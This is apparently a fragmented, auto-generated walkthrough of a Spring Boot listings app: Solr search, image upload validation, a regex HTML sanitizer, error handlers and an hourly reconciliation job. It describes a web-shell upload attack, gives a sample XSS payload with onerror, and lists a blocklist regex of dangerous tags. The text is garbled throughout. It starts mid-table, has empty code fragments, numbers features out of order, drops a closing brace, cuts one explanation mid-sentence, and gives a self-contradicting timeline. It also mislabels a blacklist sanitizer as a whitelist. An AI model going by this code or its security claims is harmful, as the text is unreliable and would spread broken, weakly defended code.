doc.addField("services", owner.getServices()) Adds the services list to Solr Solr natively supports multi-valued fields — the List<String> is stored as a multi-value field, searchable across all values
doc.addField("enabled", owner.isEnabled()) Indexes the enabled status for filtering Allows searchOwners() to add enabled:true as a filter query, excluding disabled listings from results

catch (Exception e) Catches any exception (network, timeout, Solr errors) Broad catch because Solr can throw various exceptions (SolrServerException, IOException, SolrException) — all should trigger a retry

        q.setQuery(String.format(

    } else {

    }

    if (category != null && !category.isBlank()) {

    q.setRows(size);

        return resp.getResults().stream()
                .map(doc -> (String) doc.getFieldValue("id"))
                .collect(Collectors.toList());

    } catch (Exception e) {
        log.error("search failed: {}", e.getMessage());
        return Collections.emptyList();
    }
}

public String storeFile(MultipartFile file) {
    String originalName = StringUtils.cleanPath(file.getOriginalFilename());

    try {
        if (originalName.contains("..") || originalName.contains("/") || originalName.contains("\\")) {
            log.warn("Sketchy filename rejected: {}", originalName);
            throw new FileStorageException("Invalid filename");
        }

        if (file.getSize() > MAX_FILE_SIZE) {
            throw new FileStorageException("File too big - max 5MB");
        }

        String ext = detectImageType(file);
        if (ext == null) {
            throw new FileStorageException("Not a valid image. We only accept PNG, JPEG, or GIF.");
        }

        String newFilename = UUID.randomUUID() + ext;
        Path dest = this.storageDir.resolve(newFilename);

        Files.copy(file.getInputStream(), dest, StandardCopyOption.REPLACE_EXISTING);
        log.debug("Saved {} -> {}", originalName, newFilename);

        return newFilename;

    } catch (IOException e) {
        log.error("Failed saving file: {}", originalName, e);
        throw new FileStorageException("Upload failed, try again", e);
    }
}

⚡ Feature 3: Magic Byte Image Type Detection

🔐 SECURITY DEEP DIVE: This prevents malicious file upload attacks where an attacker renames a dangerous file (executable, script) to have an image extension (.jpg, .png).

📌 What It Does

Reads the first 8 bytes of an uploaded file and compares them against known "magic byte" signatures for JPEG, PNG, and GIF images. This verifies the file IS actually an image, regardless of its extension.

Real-world attack without this protection:

  1. Attacker creates a PHP/JSP web shell named shell.jpg
  2. Uploads it — extension check passes (it ends in .jpg)
  3. Navigates to http://site.com/uploads/shell.jpg — if the server processes it as PHP, the attacker has full server access

🧠 Key Code

private String detectImageType(MultipartFile file) throws IOException {
    try (InputStream is = file.getInputStream()) {
        byte[] header = new byte[8];
        int bytesRead = is.read(header);

        if (bytesRead < 4) return null;

        // jpeg
        if (header[0] == (byte) 0xFF && header[1] == (byte) 0xD8 && header[2] == (byte) 0xFF) {
            return ".jpg";
        }

        // png
        if (header[0] == (byte) 0x89 && header[1] == (byte) 0x50 &&
                header[2] == (byte) 0x4E && header[3] == (byte) 0x47) {
            return ".png";
        }

        // gif
        if (header[0] == (byte) 0x47 && header[1] == (byte) 0x49 &&
                header[2] == (byte) 0x46 && header[3] == (byte) 0x38) {
            return ".gif";
        }

        return null;
    }
}

Code Breakdown:

Code What It Does Why It's Written This Way
try (InputStream is = file.getInputStream()) Opens the file for reading with try-with-resources — automatically closes the stream when done try-with-resources ensures the stream is closed even if an exception occurs. Without closing, file handles leak and eventually the OS runs out
byte[] header = new byte[8] Reads only the first 8 bytes of the file Magic bytes are always in the first few bytes of a file. No need to read the entire file — even a 5 MB image only needs 8 bytes checked
if (bytesRead < 4) return null Rejects files with fewer than 4 bytes A valid image file is always longer than 4 bytes. A 3-byte file can't be JPEG, PNG, or GIF
0xFF, 0xD8, 0xFF The JPEG magic bytes — every JPEG file starts with these 3 bytes This is the JPEG File Interchange Format (JFIF) signature. No other file format starts with these exact bytes
0x89, 0x50, 0x4E, 0x47 The PNG magic bytes — 0x89 followed by P, N, G in ASCII The PNG specification defines this exact 4-byte header. 0x50 0x4E 0x47 is "PNG" in ASCII
0x47, 0x49, 0x46, 0x38 The GIF magic bytes — G, I, F, 8 in ASCII GIF files start with either "GIF87a" or "GIF89a" — checking the first 4 bytes (GIF8) catches both versions

⚡ Feature 1: Multi-Pass HTML Sanitization

📌 What It Does

Strips ALL dangerous HTML from user input using a two-pass approach: first removes known dangerous tags (script, iframe, etc.) and event handlers, then strips remaining HTML tags, then decodes HTML entities and re-strips — catching double-encoding attacks.

🧠 Key Code

public final class HtmlSanitizer {

    private HtmlSanitizer() {}

    private static final Pattern DANGEROUS_TAGS = Pattern.compile(
            "<\\s*(script|iframe|object|embed|form|link|meta|style)[^>]*>.*?</\\s*\\1\\s*>|" +
                    "<\\s*(script|iframe|object|embed|form|link|meta|style)[^>]*/?>|" +
                    "\\s*on\\w+\\s*=",
            Pattern.CASE_INSENSITIVE | Pattern.DOTALL);

    private static final Pattern ALL_TAGS = Pattern.compile("<[^>]+>");

    public static String sanitize(String input) {
        if (input == null) return null;

        String clean = DANGEROUS_TAGS.matcher(input).replaceAll("");
        clean = ALL_TAGS.matcher(clean).replaceAll("");

        clean = clean.replace("&lt;", "<").replace("&gt;", ">")
                .replace("&#60;", "<").replace("&#62;", ">");

        clean = DANGEROUS_TAGS.matcher(clean).replaceAll("");
        clean = ALL_TAGS.matcher(clean).replaceAll("");

        return clean.trim();
    }

Code Breakdown:

Code What It Does Why It's Written This Way
public final class HtmlSanitizer final prevents subclassing — no one can override sanitize() with an insecure version Security utilities should be sealed (final) to prevent bypassing through inheritance
private HtmlSanitizer() {} Private constructor — this is a stateless utility class, not meant to be instantiated All methods are static, so instances are useless. Private constructor enforces correct usage
DANGEROUS_TAGS regex part 1: <\\s*(script|iframe|...)[^>]*>.*?</\\s*\\1\\s*> Matches opening AND closing tag pairs: <script>...</script>, <iframe>...</iframe> The \\1 is a back-reference that ensures the closing tag matches the opening tag. .*? is non-greedy — matches the shortest possible content between tags
DANGEROUS_TAGS regex part 2: <\\s*(script|iframe|...)[^>]*/?> Matches self-closing tags: <script/>, <iframe /> Some attacks use self-closing syntax to bypass pair-matching detectors
DANGEROUS_TAGS regex part 3: \\s*on\\w+\\s*= Matches event handler attributes: onclick=, onerror=, onmouseover=, any on*= Event handlers are a major XSS vector: <img src=x onerror="steal_cookies()"> — the onerror fires when the broken image fails to load
Pattern.CASE_INSENSITIVE Matches <SCRIPT>, <Script>, <sCrIpT> Attackers use mixed case to bypass case-sensitive filters
Pattern.DOTALL Makes . match newline characters too Without this, <script>\nalert('xss')\n</script> would bypass the regex because . normally doesn't match \n
ALL_TAGS regex: <[^>]+> Matches any HTML tag: <b>, <div class="x">, </p> After removing dangerous tags, this strips ALL remaining HTML — a whitelist approach (allow nothing) rather than blacklist (block some)
First pass: DANGEROUS_TAGS then ALL_TAGS Removes dangerous tags first, then strips all remaining tags Two-phase approach: first neutralize known threats, then strip everything else
clean.replace("&lt;", "<") etc. Decodes HTML entities back to their literal characters Double-encoding attack prevention: An attacker might submit &lt;script&gt; which passes the first regex pass (no < characters). After decoding, it becomes <script> — which the second pass catches
Second pass: DANGEROUS_TAGS then ALL_TAGS again Re-runs the same sanitization after entity decoding Catches any tags that were hidden inside HTML entities. This is the "decode then re-strip" pattern
return clean.trim() Removes leading/trailing whitespace Clean output — extra spaces from removed tags are trimmed

Chosen: Custom regex-based sanitizer with two-pass approach.
Alternative: OWASP Java HTML Sanitizer library. The code comment says "For a real app I'd use OWASP Java HTML Sanitizer library, but this covers the basics for our MVP." OWASP is more comprehensive (handles edge cases, configurable allowlists) but adds a dependency.
Why the chosen approach wins: Zero dependencies, covers the most common XSS vectors. Sufficient for MVP. The comment is honest about the tradeoff — production should use OWASP.

  • If only one pass (no entity decoding): Double-encoding attacks bypass the sanitizer

⚡ Feature 4: Runtime Exception & Conflict Handler (409/500)

📌 What It Does

Catches general runtime exceptions and checks if they're optimistic locking conflicts (409 Conflict) or unexpected errors (delegated to the 500 handler).

🧠 Key Code

@ExceptionHandler(RuntimeException.class)
public ResponseEntity<?> runtimeError(RuntimeException ex) {
    if (ex.getMessage() != null && ex.getMessage().contains("Conflict")) {
        log.info("Optimistic lock conflict");
        return ResponseEntity
                .status(HttpStatus.CONFLICT)
                .body(errorBody("Record was modified - please refresh and try again", 409));
    }
    return unexpectedError(ex);
}

Code Breakdown:

Code What It Does Why It's Written This Way
@ExceptionHandler(RuntimeException.class) Catches all runtime exceptions not handled by more specific handlers Spring matches the most specific handler first — ResourceNotFoundException (which extends RuntimeException) is caught by its own handler. Only "uncategorized" runtime exceptions reach here
ex.getMessage().contains("Conflict") Checks if the exception is related to a concurrent modification conflict This is a string-matching approach for detecting ConcurrentModificationException. The @ResponseStatus(CONFLICT) on that exception ensures the message contains "Conflict"
log.info("Optimistic lock conflict") Logs at INFO level — conflicts are operational events, not errors info because conflicts are expected behavior in a multi-user system — they indicate the locking system is working correctly
HttpStatus.CONFLICT (409) Returns 409 Conflict — tells the client "your request conflicts with the current state" 409 is the HTTP standard for edit conflicts — clients know to reload and retry
return unexpectedError(ex) Falls through to the generic error handler if it's not a conflict Clean separation — conflicts are handled, everything else goes to the 500 handler

⚙️ Why This Approach Was Chosen

Chosen: String-based conflict detection within a general RuntimeException handler.
Alternative: Separate @ExceptionHandler(ConcurrentModificationException.class). This is cleaner and more type-safe — the string matching is fragile.
Why the chosen approach works: It catches the conflict but is a candidate for refactoring. A dedicated handler per exception type is the better pattern.

🔗 How It Connects to the Rest of the System

  • ConcurrentModificationException: Thrown by OwnerService.updateOwner() when version mismatch occurs
  • If this handler didn't check for conflicts: All conflicts would return 500 instead of 409

💬 Manager Explanation

"When two people edit the same listing simultaneously, we detect the conflict and send a clear '409 Conflict' message telling them to reload. Any other unexpected errors are caught here and handled safely."

⚡ Feature 5: Global Catch-All & Error Body Builder (500)

📌 What It Does

Catches ALL remaining uncaught exceptions and returns a generic 500 error without leaking any internal details. Also provides the standardized error response format used by all handlers.

🧠 Key Code

@ExceptionHandler(Exception.class)
public ResponseEntity<?> unexpectedError(Exception ex) {
    log.error("Unexpected error: ", ex);
    return ResponseEntity
            .status(HttpStatus.INTERNAL_SERVER_ERROR)
            .body(errorBody("Something went wrong. Please try again later.", 500));

private Map<String, Object> errorBody(String message, int status) {
    Map<String, Object> body = new HashMap<>();
    body.put("timestamp", LocalDateTime.now());
    body.put("status", status);
    body.put("message", message);
    return body;
}

Code Breakdown:

Code What It Does Why It's Written This Way
@ExceptionHandler(Exception.class) Catches EVERY exception not handled by a more specific handler — the ultimate safety net Exception.class is the root of all non-error exceptions. This ensures no exception ever reaches the client unformatted
log.error("Unexpected error: ", ex) Logs the FULL stack trace at ERROR level The second argument ex (no {} placeholder) tells SLF4J to print the complete stack trace. This goes to server logs for debugging — NOT to the client
"Something went wrong. Please try again later." Generic user-facing message Security: Never reveals internal details (class names, SQL queries, file paths) to the client. Attackers use error details to find vulnerabilities
errorBody(String message, int status) Creates a consistent error response Map with timestamp, status, and message Standardized format means clients parse all errors the same way. The timestamp helps correlate client errors with server logs
body.put("timestamp", LocalDateTime.now()) Includes the server time when the error occurred Useful for debugging — match client error reports to server log entries by timestamp

⚙️ Why This Approach Was Chosen

Chosen: Generic 500 response with internal logging.
Alternative: Exposing the exception message in the response (common in dev but dangerous in prod). This leaks implementation details.
Why the chosen approach wins: Security — internal details stay internal. The generic message tells users something went wrong without helping attackers.

🔗 How It Connects to the Rest of the System

  • Safety net: If ANY new exception type is added without a handler, this catches it — the API never shows raw error pages
  • errorBody(): Used by ALL handlers for consistent response format
  • If removed: Unhandled exceptions return Spring's default HTML error page (with stack traces in dev mode)

💬 Manager Explanation

"If anything unexpected goes wrong — a database crash, a code bug, anything — we never show the user technical details. ⚡ Feature 2: Hourly Batched Reconciliation with Safety Limits

🔎 SEARCH DEEP DIVE: This is the core mechanism that ensures the dual-write pattern (MongoDB + Solr) stays consistent despite failures, restarts, and timing gaps.

📌 What It Does

Every hour, reads ALL owners from MongoDB in pages of 100, and re-indexes each one into Solr. This overwrites any stale Solr data with the current MongoDB state, fixing any drift between the two systems.

🧠 Key Code

@Scheduled(fixedRate = 3600000) // Every hour
public void syncMongoToSolr() {
    log.info("Starting hourly reconciliation...");

    int page = 0;
    long indexed = 0;
    Page<Owner> batch;

    do {
        batch = ownerRepo.findAll(PageRequest.of(page, BATCH_SIZE));

        for (Owner owner : batch.getContent()) {
            // Index ALL owners - Solr query filters by enabled:true
            // This fixes bug where disabled owners stayed searchable
            solr.indexOwner(owner);
            indexed++;
        }

        page++;

        if (page >= MAX_BATCHES) {
            log.warn("Hit safety limit at {} batches, stopping", MAX_BATCHES);
            break;
        }

    } while (batch.hasNext());

    log.info("Reconciliation done. Re-indexed {} owners.", indexed);
}

Code Breakdown:

Code What It Does Why It's Written This Way
@Scheduled(fixedRate = 3600000) Runs this method every 3,600,000 milliseconds (1 hour) from a fixed interval fixedRate means the next run starts 1 hour after the PREVIOUS RUN STARTED (not after it finished). If the job takes 5 minutes, the next run starts 55 minutes after it ends. This ensures consistent hourly frequency
log.info("Starting hourly reconciliation...") Marks the start of reconciliation in logs INFO level — this is a normal, expected operation. Operations teams can track how long reconciliation takes by comparing start and end timestamps
int page = 0; long indexed = 0; Initializes the page counter and re-index counter page tracks which batch we're on. indexed counts total owners processed for the summary log
do { ... } while (batch.hasNext()) Do-while loop — processes at least one batch and continues until all pages are exhausted do-while ensures we always process the first page even if hasNext() would be false for a single-page result
ownerRepo.findAll(PageRequest.of(page, BATCH_SIZE)) Fetches page N of owners from MongoDB, 100 per page Spring Data's pagination — PageRequest.of(0, 100) gets the first 100, .of(1, 100) gets the next 100, etc. This prevents loading the entire collection into memory
batch.getContent() Extracts the List<Owner> from the Page object .getContent() returns just the data — the Page wrapper also contains metadata (total, hasNext)
Comment: "Index ALL owners - Solr query filters by enabled:true" Documents why disabled owners are also re-indexed Important design decision: Disabled owners are indexed with enabled:false so Solr's enabled:true filter excludes them. This is safer than deleting them from Solr — if the delete fails, a disabled owner remains searchable
solr.indexOwner(owner) Re-indexes each owner (the @Async annotation on indexOwner makes this non-blocking) If the owner already exists in Solr, this upserts (updates) it. If it's missing (failed initial indexing), this adds it. Solr uses the id field to determine upsert vs. insert
indexed++ Counts processed owners Simple counter for the summary log
page >= MAX_BATCHES Emergency brake — stops after 1000 batches Without this, a bug in pagination logic could create an infinite loop. At 100 per batch, this allows up to 100,000 owners — far beyond the MVP's expected scale
log.warn("Hit safety limit...") Logs at WARN if the safety limit is reached WARN because hitting this limit means either the dataset grew beyond expectations or there's a pagination bug
log.info("Reconciliation done. Re-indexed {} owners.", indexed) Logs the total count when finished Operations teams can verify: "reconciliation processed 5,432 owners in 2 minutes" — useful for monitoring growth

⚙️ Why This Approach Was Chosen

Chosen: Full re-index every hour with batched pagination.
Alternative 1: Change Data Capture (CDC) — only re-index owners modified since the last reconciliation. More efficient but requires tracking "last reconciled at" timestamps and adds complexity.
Alternative 2: Event-driven reconciliation — use MongoDB Change Streams to push changes to Solr in real-time. Most efficient but requires persistent listeners and infrastructure.
Alternative 3: Selective reconciliation — compare checksums between MongoDB and Solr to find mismatches. Complex implementation for minimal benefit at MVP scale.
Why the chosen approach wins: The comment says it best: "Not elegant but reliable." Full re-index is brute-force but guarantees consistency regardless of what caused the drift. At MVP scale (hundreds to low thousands of owners), the hourly re-index takes seconds to minutes — the simplicity is worth the minor overhead.

🔗 How It Connects to the Rest of the System

  • Fixes failures from: SolrService.indexOwner() when async retries are exhausted
  • Fixes Solr restarts: If Solr crashes and loses its index, the next hourly run rebuilds the entire index
  • Fixes soft-delete staleness: If OwnerService.deleteOwner() soft-deleted an owner but Solr indexing failed, this re-indexes the owner with enabled:false
  • @EnableScheduling: Required in the main application class for @Scheduled to trigger
  • If removed: Any Solr indexing failure becomes permanent — affected listings never appear in search

💬 Manager Explanation

"Every hour, our system automatically compares the main database with the search engine and fixes any differences. If a listing was saved to the database but the search engine missed it — maybe due to a temporary network issue — this repair job catches it and updates the search engine. It's like a self-healing system that ensures our search results are always accurate."

⚡ Feature 3: Eventual Consistency Architecture Pattern

📌 What It Does

This isn't a code feature but the architectural pattern that the entire dual-write system relies on. Understanding it is critical for explaining the system to your manager.

🧠 Key Concept: The Consistency Timeline

T=0:   Owner saved to MongoDB ✅
T=0.1: Solr indexing attempted (async, may fail)
T=0-1s: If Solr succeeds → immediate consistency ✅
T=0-9s: If Solr retry 1 succeeds → near-immediate consistency ✅
T=0-6s: If all retries fail → listing exists in MongoDB but NOT in Solr search ⚠️
T=60m:  ReconciliationJob runs → Solr re-indexed → consistency restored ✅

What "Eventual Consistency" means in this system:

Scenario Time to Consistency User Impact
Solr indexing succeeds on first try ~10 seconds (COMMIT_WITHIN) None — listing appears in search almost immediately
Solr succeeds on retry 2 or 3 10-16 seconds None — barely noticeable delay
All retries fail, job fixes it Up to 60 minutes Listing is accessible by direct link but won't appear in search results for up to 1 hour
Solr is completely down for hours Fixed on next successful job run Extended search unavailability, but MongoDB (the source of truth) is unaffected

⚙️ Why This Approach Was Chosen

Chosen: Eventual consistency with a scheduled reconciliation safety net.
Alternative: Strong consistency — don't return success to the user until BOTH MongoDB and Solr confirm the write. This means the API blocks on Solr, and if Solr is down, the entire application can't accept new listings.
Why eventual consistency wins: The application stays fast and available even when the search engine has problems. A 1-hour search delay is vastly better than "our entire application is down because the search engine is having issues."

💬 Manager Explanation

"Our system is designed to be resilient. When we save data, we save it to the main database first — that's instant and reliable. Then we update the search engine in the background. If the search engine update fails, we have an hourly repair process that fixes it automatically. This means our application stays fast and available even if the search engine has temporary issues — the worst case is a listing takes up to an hour to appear in search results, rather than the entire system going down."
